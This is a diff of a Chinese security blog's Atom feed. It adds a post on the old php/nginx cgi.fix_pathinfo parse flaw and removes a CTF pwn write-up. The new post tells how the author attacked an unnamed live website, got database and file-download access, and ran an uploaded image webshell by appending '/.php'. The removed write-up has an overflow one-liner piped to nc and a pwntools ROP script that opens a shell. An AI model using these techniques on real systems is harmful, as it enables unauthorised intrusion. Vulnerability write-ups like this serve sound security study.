@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://winter3un.github.io/"/>
-  <updated>2017-10-29T13:04:49.984Z</updated>
+  <updated>2018-02-21T07:27:14.303Z</updated>
   <id>https://winter3un.github.io/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>低版本php+nginx 解析漏洞</title>
+    <link href="https://winter3un.github.io/2018/02/20/2018-2-21/"/>
+    <id>https://winter3un.github.io/2018/02/20/2018-2-21/</id>
+    <published>2018-02-21T07:20:42.000Z</published>
+    <updated>2018-02-21T07:27:14.303Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是<code>1.6.2</code>，php版本是<code>5.3.3</code>，开了<code>GPC</code>，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个<code>/.php</code>访问，它。。竟然执行了！？<br><img src="/2018/02/20/2018-2-21/5.png" alt="5.png" title=""></p><a id="more"></a><img src="/2018/02/20/2018-2-21/6.png" alt="6.png" title=""><p>它怎么能执行？？不是小于&lt;= 0.8.37么，这nginx版本咋能执行？？？</p><p><strong>下图来自wooyun</strong></p><img src="/2018/02/20/2018-2-21/2.jpg" alt="2.jpg" title=""><p>这和说好的不一样喂？？？？<br><img src="/2018/02/20/2018-2-21/1.jpg" alt="1.jpg" title=""></p><p>群里吐槽了一番后ing，发现。。。这解析漏洞并不是nginx造成的问题，是因为php啊。。。。</p><img src="/2018/02/20/2018-2-21/4.png" alt="4.png" title=""><img src="/2018/02/20/2018-2-21/3.jpg" alt="3.jpg" title=""><p>php版本 <code>&lt;= 5.3.9</code>的时候（之后版本里有<code>security.limit_extensions</code>配置限制），配合<code>nginx</code>（无论版本多高），在默认配置下（<code>cgi.fix_pathinfo</code>全版本php默认配置为开启），存在php解析漏洞。</p><p>元凶是php.ini中的<code>cgi.fix_pathinfo</code>，nginx完成一次助攻。。。</p><img src="/2018/02/20/2018-2-21/5.jpg" alt="5.jpg" title=""><p>由于这个解析漏洞被官方认为是特性而不是漏洞，所以没有cve。。。。</p><p>btw：在本机测试的时候，发现phpstudy全版本nginx+php存在这个解析漏洞。。。。这应该算是意外的惊喜。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://drops.xmd5.com/static/drops/papers-539.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-539.html</a>  解析漏洞总结</p><p><a href="http://www.laruence.com/2010/05/20/1495.html" target="_blank" rel="external">http://www.laruence.com/2010/05/20/1495.html</a>  Nginx + PHP CGI的一个可能的安全漏洞</p><p><a href="http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html" target="_blank" rel="external">http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html</a>  PHP CGI 中 fix_pathinfo 引起的安全隐患</p><p><a href="https://taobig.org/?p=650" target="_blank" rel="external">https://taobig.org/?p=650</a>   php.ini中的cgi.fix_pathinfo选项</p><p><a href="https://bugs.php.net/bug.php?id=55181" target="_blank" rel="external">https://bugs.php.net/bug.php?id=55181</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是&lt;code&gt;1.6.2&lt;/code&gt;，php版本是&lt;code&gt;5.3.3&lt;/code&gt;，开了&lt;code&gt;GPC&lt;/code&gt;，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个&lt;code&gt;/.php&lt;/code&gt;访问，它。。竟然执行了！？&lt;br&gt;&lt;img src=&quot;/2018/02/20/2018-2-21/5.png&quot; alt=&quot;5.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>对cve-2017-0199与cve-2017-8759的浅析</title>
@@ -66,9 +86,9 @@
     
       <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
     
-      <category term="awd" scheme="https://winter3un.github.io/tags/awd/"/>
-    
       <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
+    
+      <category term="awd" scheme="https://winter3un.github.io/tags/awd/"/>
     
   </entry>
   
@@ -502,32 +522,6 @@
       <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
     
       <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【CFF2016-pwn】 Writeup</title>
-    <link href="https://winter3un.github.io/2016/06/20/CCF2016/"/>
-    <id>https://winter3un.github.io/2016/06/20/CCF2016/</id>
-    <published>2016-06-20T17:55:02.000Z</published>
-    <updated>2016-12-20T02:38:20.014Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>简单的变量覆盖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python -c &apos;print &quot;a&quot;*0x40+&quot;\x1b\x86\x04\x08&quot;&apos;|nc 139.196.232.222 54000</div><div class="line">一发带走</div></pre></td></tr></table></figure><img src="/2016/06/20/CCF2016/1.png" alt="1.png" title=""><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>scanf没有限制输入字节，可发送超长字符串导致栈溢出。</p><p>只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个<code>&quot;/bin/sh\0&quot;</code>然后构造rop，拿shell<br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">elf = ELF(<span class="string">'memory'</span>)</div><div class="line">system_plt = elf.symbols[<span class="string">'system'</span>]</div><div class="line">scanf_plt = elf.symbols[<span class="string">'__isoc99_scanf'</span>]</div><div class="line">pp_ret = <span class="number">0x804877e</span></div><div class="line">_s = <span class="number">0x8048817</span></div><div class="line">data =  <span class="number">0x0804A038</span></div><div class="line"></div><div class="line">p = process(<span class="string">'./memory'</span>)</div><div class="line">payload1 = <span class="string">'a'</span>*(<span class="number">0x13</span>+<span class="number">4</span>)+p32(scanf_plt)+p32(pp_ret)+p32(_s)+p32(data)+p32(system_plt)+p32(<span class="number">0</span>)+p32(data)</div><div class="line">p.sendline(payload1)</div><div class="line">p.sendline(<span class="string">'/bin/sh\0'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>接下来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">find /|grep flag</div><div class="line">/bin/cat xxx #忘记位置了</div></pre></td></tr></table></figure></p><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><img src="/2016/06/20/CCF2016/3.png" alt="3.png" title=""><p>把文件里面这个位置的数据改成0x88，进入这个函数里面，会给一个web服务器的地址，把改变后的文件上传就拿flag。</p><p>PS：pwn3，500题，这么简单？</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h3&gt;&lt;p&gt;简单的变量覆盖。&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;python -c &amp;apos;print &amp;quot;a&amp;quot;*0x40+&amp;quot;\x1b\x86\x04\x08&amp;quot;&amp;apos;|nc 139.196.232.222 54000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;一发带走&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img src=&quot;/2016/06/20/CCF2016/1.png&quot; alt=&quot;1.png&quot; title=&quot;&quot;&gt;
-&lt;h3 id=&quot;pwn2&quot;&gt;&lt;a href=&quot;#pwn2&quot; class=&quot;headerlink&quot; title=&quot;pwn2&quot;&gt;&lt;/a&gt;pwn2&lt;/h3&gt;&lt;p&gt;scanf没有限制输入字节，可发送超长字符串导致栈溢出。&lt;/p&gt;
-&lt;p&gt;只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个&lt;code&gt;&amp;quot;/bin/sh\0&amp;quot;&lt;/code&gt;然后构造rop，拿shell&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
-    
-      <category term="Writeup" scheme="https://winter3un.github.io/tags/Writeup/"/>
     
   </entry>
   
